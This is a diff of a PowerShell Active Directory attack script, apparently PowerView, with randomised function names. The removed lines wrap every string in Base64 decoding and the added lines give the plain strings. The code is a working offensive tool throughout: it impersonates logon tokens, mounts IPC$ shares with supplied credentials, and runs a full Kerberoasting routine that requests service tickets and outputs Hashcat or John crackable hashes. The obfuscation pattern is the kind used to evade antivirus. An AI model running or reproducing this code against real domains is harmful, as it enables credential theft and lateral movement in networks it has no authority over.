-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dPUkRfRVhQSVJFRA=="))), 8388608)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RFRF9UT19BVVRIX0ZPUl9ERUxFR0FUSU9O"))), 16777216)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFSVElBTF9TRUNSRVRTX0FDQ09VTlQ="))), 67108864)
+        $UACValues.Add("SCRIPT", 1)
+        $UACValues.Add("ACCOUNTDISABLE", 2)
+        $UACValues.Add("HOMEDIR_REQUIRED", 8)
+        $UACValues.Add("LOCKOUT", 16)
+        $UACValues.Add("PASSWD_NOTREQD", 32)
+        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
+        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
+        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
+        $UACValues.Add("NORMAL_ACCOUNT", 512)
+        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
+        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
+        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
+        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
+        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
+        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
+        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
+        $UACValues.Add("NOT_DELEGATED", 1048576)
+        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
+        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
+        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
+        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
+        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
     }
 
     PROCESS {
@@ -1238,17 +1242,17 @@ function aupief {
         if ($ShowAll) {
             ForEach ($UACValue in $UACValues.GetEnumerator()) {
                 if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
-                    $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9Kw=="))) -f $($UACValue.Value)))
+                    $ResultUACValues.Add($UACValue.Name, ("{0}+" -f $($UACValue.Value)))
                 }
                 else {
-                    $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($UACValue.Value)))
+                    $ResultUACValues.Add($UACValue.Name, ("{0}" -f $($UACValue.Value)))
                 }
             }
         }
         else {
             ForEach ($UACValue in $UACValues.GetEnumerator()) {
                 if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
-                    $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($UACValue.Value)))
+                    $ResultUACValues.Add($UACValue.Name, ("{0}" -f $($UACValue.Value)))
                 }
             }
         }
@@ -1257,7 +1261,7 @@ function aupief {
 }
 
 
-function vfqaum {
+function aozfoj {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -1280,24 +1284,24 @@ function vfqaum {
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 
     try {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] -or ($Identity -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r"))))) {
-            if ($Identity -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LitcXC4r")))) {
+        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
+            if ($Identity -match '.+\\.+') {
                 
-                $ConvertedIdentity = $Identity | vqxllx -OutputType Canonical
+                $ConvertedIdentity = $Identity | jjxazw -OutputType Canonical
                 if ($ConvertedIdentity) {
-                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
-                    $ObjectIdentity = $Identity.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBCaW5kaW5nIHRvIGRvbWFpbiAnJENvbm5lY3RUYXJnZXQ=")))
+                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
+                    $ObjectIdentity = $Identity.Split('\')[1]
+                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                 }
             }
             else {
                 $ObjectIdentity = $Identity
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBCaW5kaW5nIHRvIGRvbWFpbiAnJERvbWFpbg==")))
+                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
                 $ConnectTarget = $Domain
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHM=")))
+            if ($PSBoundParameters['Credential']) {
+                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                 $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             }
             else {
@@ -1305,9 +1309,9 @@ function vfqaum {
             }
         }
         else {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHM=")))
-                $DomainName = wjdyuo | Select-Object -ExpandProperty Name
+            if ($PSBoundParameters['Credential']) {
+                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
+                $DomainName = owdzhi | Select-Object -ExpandProperty Name
                 $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             }
             else {
@@ -1317,17 +1321,17 @@ function vfqaum {
         }
 
         $Out = New-Object PSObject
-        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29udGV4dA=="))) $Context
-        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) $ObjectIdentity
+        $Out | Add-Member Noteproperty 'Context' $Context
+        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
         $Out
     }
     catch {
-        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1QcmluY2lwYWxDb250ZXh0XSBFcnJvciBjcmVhdGluZyBiaW5kaW5nIGZvciBvYmplY3QgKCckSWRlbnRpdHknKSBjb250ZXh0IDogezB9"))) -f $_)
+        Write-Warning ("[Get-PrincipalContext] Error creating binding for object ('$Identity') context : {0}" -f $_)
     }
 }
 
 
-function jymmbe {
+function ehlhmp {
 
 
     [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
@@ -1356,10 +1360,10 @@ function jymmbe {
 
     PROCESS {
         $Paths = @()
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             ForEach ($TargetComputerName in $ComputerName) {
-                $TargetComputerName = $TargetComputerName.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
-                $Paths += ,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkVGFyZ2V0Q29tcHV0ZXJOYW1lXElQQyQ=")))
+                $TargetComputerName = $TargetComputerName.Trim('\')
+                $Paths += ,"\\$TargetComputerName\IPC$"
             }
         }
         else {
@@ -1368,24 +1372,24 @@ function jymmbe {
 
         ForEach ($TargetPath in $Paths) {
             $NetResourceInstance.lpRemoteName = $TargetPath
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1SZW1vdGVDb25uZWN0aW9uXSBBdHRlbXB0aW5nIHRvIG1vdW50OiAkVGFyZ2V0UGF0aA==")))
+            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"
 
             
             
             $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
 
             if ($Result -eq 0) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRhcmdldFBhdGggc3VjY2Vzc2Z1bGx5IG1vdW50ZWQ=")))
+                Write-Verbose "$TargetPath successfully mounted"
             }
             else {
-                Throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1SZW1vdGVDb25uZWN0aW9uXSBlcnJvciBtb3VudGluZyAkVGFyZ2V0UGF0aCA6IHswfQ=="))) -f $(([ComponentModel.Win32Exception]$Result).Message))
+                Throw ("[Add-RemoteConnection] error mounting $TargetPath : {0}" -f $(([ComponentModel.Win32Exception]$Result).Message))
             }
         }
     }
 }
 
 
-function erbqbk {
+function oqraoh {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -1405,10 +1409,10 @@ function erbqbk {
 
     PROCESS {
         $Paths = @()
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             ForEach ($TargetComputerName in $ComputerName) {
-                $TargetComputerName = $TargetComputerName.Trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))
-                $Paths += ,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkVGFyZ2V0Q29tcHV0ZXJOYW1lXElQQyQ=")))
+                $TargetComputerName = $TargetComputerName.Trim('\')
+                $Paths += ,"\\$TargetComputerName\IPC$"
             }
         }
         else {
@@ -1416,21 +1420,21 @@ function erbqbk {
         }
 
         ForEach ($TargetPath in $Paths) {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1SZW1vdGVDb25uZWN0aW9uXSBBdHRlbXB0aW5nIHRvIHVubW91bnQ6ICRUYXJnZXRQYXRo")))
+            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
             $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)
 
             if ($Result -eq 0) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRhcmdldFBhdGggc3VjY2Vzc2Z1bGx5IHVtbW91bnRlZA==")))
+                Write-Verbose "$TargetPath successfully ummounted"
             }
             else {
-                Throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1SZW1vdGVDb25uZWN0aW9uXSBlcnJvciB1bm1vdW50aW5nICRUYXJnZXRQYXRoIDogezB9"))) -f $(([ComponentModel.Win32Exception]$Result).Message))
+                Throw ("[Remove-RemoteConnection] error unmounting $TargetPath : {0}" -f $(([ComponentModel.Win32Exception]$Result).Message))
             }
         }
     }
 }
 
 
-function jgnbzn {
+function kckfvi {
 
 
     [OutputType([IntPtr])]
@@ -1450,11 +1454,11 @@ function jgnbzn {
         $Quiet
     )
 
-    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1RB")))) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UXVpZXQ=")))])) {
-        Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gcG93ZXJzaGVsbC5leGUgaXMgbm90IGN1cnJlbnRseSBpbiBhIHNpbmdsZS10aHJlYWRlZCBhcGFydG1lbnQgc3RhdGUsIHRva2VuIGltcGVyc29uYXRpb24gbWF5IG5vdCB3b3JrLg==")))
+    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
+        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
     }
 
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU=")))]) {
+    if ($PSBoundParameters['TokenHandle']) {
         $LogonTokenHandle = $TokenHandle
     }
     else {
@@ -1462,14 +1466,14 @@ function jgnbzn {
         $NetworkCredential = $Credential.GetNetworkCredential()
         $UserDomain = $NetworkCredential.Domain
         $UserName = $NetworkCredential.UserName
-        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gRXhlY3V0aW5nIExvZ29uVXNlcigpIHdpdGggdXNlcjogezB9XHsxfQ=="))) -f $($UserDomain), $($UserName))
+        Write-Warning ("[Invoke-UserImpersonation] Executing LogonUser() with user: {0}\{1}" -f $($UserDomain), $($UserName))
 
         
         
         $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
 
         if (-not $Result) {
-            throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gTG9nb25Vc2VyKCkgRXJyb3I6IHswfQ=="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
+            throw ("[Invoke-UserImpersonation] LogonUser() Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError).Message))
         }
     }
 
@@ -1477,15 +1481,15 @@ function jgnbzn {
     $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)
 
     if (-not $Result) {
-        throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gSW1wZXJzb25hdGVMb2dnZWRPblVzZXIoKSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
+        throw ("[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError).Message))
     }
 
-    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbl0gQWx0ZXJuYXRlIGNyZWRlbnRpYWxzIHN1Y2Nlc3NmdWxseSBpbXBlcnNvbmF0ZWQ=")))
+    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
     $LogonTokenHandle
 }
 
 
-function husafk {
+function njmybn {
 
 
     [CmdletBinding()]
@@ -1495,22 +1499,22 @@ function husafk {
         $TokenHandle
     )
 
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU=")))]) {
-        Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1SZXZlcnRUb1NlbGZdIFJldmVydGluZyB0b2tlbiBpbXBlcnNvbmF0aW9uIGFuZCBjbG9zaW5nIExvZ29uVXNlcigpIHRva2VuIGhhbmRsZQ==")))
+    if ($PSBoundParameters['TokenHandle']) {
+        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
         $Result = $Kernel32::CloseHandle($TokenHandle)
     }
 
     $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
 
     if (-not $Result) {
-        throw (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1SZXZlcnRUb1NlbGZdIFJldmVydFRvU2VsZigpIEVycm9yOiB7MH0="))) -f $(([ComponentModel.Win32Exception] $LastError).Message))
+        throw ("[Invoke-RevertToSelf] RevertToSelf() Error: {0}" -f $(([ComponentModel.Win32Exception] $LastError).Message))
     }
 
-    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ludm9rZS1SZXZlcnRUb1NlbGZdIFRva2VuIGltcGVyc29uYXRpb24gc3VjY2Vzc2Z1bGx5IHJldmVydGVk")))
+    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
 }
 
 
-function tinlez {
+function vtlabq {
 
 
     [OutputType('PowerView.SPNTicket')]
@@ -1530,7 +1534,7 @@ function tinlez {
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
-        $OutputFormat = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGFzaGNhdA=="))),
+        $OutputFormat = 'Hashcat',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -1538,15 +1542,15 @@ function tinlez {
     )
 
     BEGIN {
-        $Null = [Reflection.Assembly]::LoadWithPartialName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklkZW50aXR5TW9kZWw="))))
+        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))]) {
+        if ($PSBoundParameters['User']) {
             $TargetObject = $User
         }
         else {
@@ -1554,15 +1558,15 @@ function tinlez {
         }
 
         ForEach ($Object in $TargetObject) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))]) {
+            if ($PSBoundParameters['User']) {
                 $UserSPN = $Object.ServicePrincipalName
                 $SamAccountName = $Object.SamAccountName
                 $DistinguishedName = $Object.DistinguishedName
             }
             else {
                 $UserSPN = $Object
-                $SamAccountName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
-                $DistinguishedName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
+                $SamAccountName = 'UNKNOWN'
+                $DistinguishedName = 'UNKNOWN'
             }
 
             
@@ -1574,7 +1578,7 @@ function tinlez {
                 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
             }
             catch {
-                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TUE5UaWNrZXRdIEVycm9yIHJlcXVlc3RpbmcgdGlja2V0IGZvciBTUE4gJyRVc2VyU1BOJyBmcm9tIHVzZXIgJyREaXN0aW5ndWlzaGVkTmFtZScgOiB7MH0="))) -f $_)
+                Write-Warning ("[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : {0}" -f $_)
             }
             if ($Ticket) {
                 $TicketByteStream = $Ticket.GetRequest()
@@ -1582,54 +1586,54 @@ function tinlez {
             if ($TicketByteStream) {
                 $Out = New-Object PSObject
 
-                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
+                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
 
-                $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FtQWNjb3VudE5hbWU="))) $SamAccountName
-                $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzdGluZ3Vpc2hlZE5hbWU="))) $DistinguishedName
-                $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVByaW5jaXBhbE5hbWU="))) $Ticket.ServicePrincipalName
+                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
+                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
+                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
                 
                 
-                if($TicketHexStream -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YTM4Mi4uLi4zMDgyLi4uLkEwMDMwMjAxKD88RXR5cGVMZW4+Li4pQTEuezEsNH0uLi4uLi4uQTI4Mig/PENpcGhlclRleHRMZW4+Li4uLikuLi4uLi4uLig/PERhdGFUb0VuZD4uKyk=")))) {
+                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                     $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                     $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                     $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
 
                     
-                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QTQ4Mg==")))) {
-                        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgcGFyc2luZyBjaXBoZXJ0ZXh0IGZvciB0aGUgU1BOICB7MH0uIFVzZSB0aGUgVGlja2V0Qnl0ZUhleFN0cmVhbSBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgaGFzaCBvZmZsaW5lIHdpdGggR2V0LUtlcmJlcm9hc3RIYXNoRnJvbUFQUmVx"))) -f $($Ticket.ServicePrincipalName))
+                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
+                        Write-Warning ("Error parsing ciphertext for the SPN  {0}. Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq" -f $($Ticket.ServicePrincipalName))
                         $Hash = $null
-                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGlja2V0Qnl0ZUhleFN0cmVhbQ=="))) ([Bitconverter]::ToString($TicketByteStream).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ=="))),''))
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                     } else {
-                        $Hash = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9YCR7MX0="))) -f $($CipherText.Substring(0,32)), $($CipherText.Substring(32)))
-                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGlja2V0Qnl0ZUhleFN0cmVhbQ=="))) $null
+                        $Hash = ("{0}`${1}" -f $($CipherText.Substring(0,32)), $($CipherText.Substring(32)))
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                     }
                 } else {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHBhcnNlIHRpY2tldCBzdHJ1Y3R1cmUgZm9yIHRoZSBTUE4gIHswfS4gVXNlIHRoZSBUaWNrZXRCeXRlSGV4U3RyZWFtIGZpZWxkIGFuZCBleHRyYWN0IHRoZSBoYXNoIG9mZmxpbmUgd2l0aCBHZXQtS2VyYmVyb2FzdEhhc2hGcm9tQVBSZXE="))) -f $($Ticket.ServicePrincipalName))
+                    Write-Warning ("Unable to parse ticket structure for the SPN  {0}. Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq" -f $($Ticket.ServicePrincipalName))
                     $Hash = $null
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGlja2V0Qnl0ZUhleFN0cmVhbQ=="))) ([Bitconverter]::ToString($TicketByteStream).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ=="))),''))
+                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                 }
 
                 if($Hash) {
                     
-                    if ($OutputFormat -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Sm9obg==")))) {
-                        $HashFormat = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YCRrcmI1dGdzYCR7MH06JEhhc2g="))) -f $($Ticket.ServicePrincipalName))
+                    if ($OutputFormat -match 'John') {
+                        $HashFormat = ("`$krb5tgs`${0}:$Hash" -f $($Ticket.ServicePrincipalName))
                     }
                     else {
-                        if ($DistinguishedName -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))) {
-                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                        if ($DistinguishedName -ne 'UNKNOWN') {
+                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                         else {
-                            $UserDomain = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
+                            $UserDomain = 'UNKNOWN'
                         }
 
                         
-                        $HashFormat = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YCRrcmI1dGdzYCR7MH1gJCokU2FtQWNjb3VudE5hbWVgJCRVc2VyRG9tYWluYCR7MX0qYCQkSGFzaA=="))) -f $($Etype), $($Ticket.ServicePrincipalName))
+                        $HashFormat = ("`$krb5tgs`${0}`$*$SamAccountName`$$UserDomain`${1}*`$$Hash" -f $($Etype), $($Ticket.ServicePrincipalName))
                     }
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGFzaA=="))) $HashFormat
+                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 }
 
-                $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNQTlRpY2tldA=="))))
+                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 $Out
             }
         }
@@ -1637,13 +1641,13 @@ function tinlez {
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function bhbbyd {
+function bwtvhj {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -1676,7 +1680,7 @@ function bhbbyd {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -1692,7 +1696,7 @@ function bhbbyd {
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
-        $OutputFormat = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGFzaGNhdA=="))),
+        $OutputFormat = 'Hashcat',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -1702,37 +1706,37 @@ function bhbbyd {
     BEGIN {
         $UserSearcherArguments = @{
             'SPN' = $True
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsc2VydmljZXByaW5jaXBhbG5hbWU=")))
+            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $UserSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
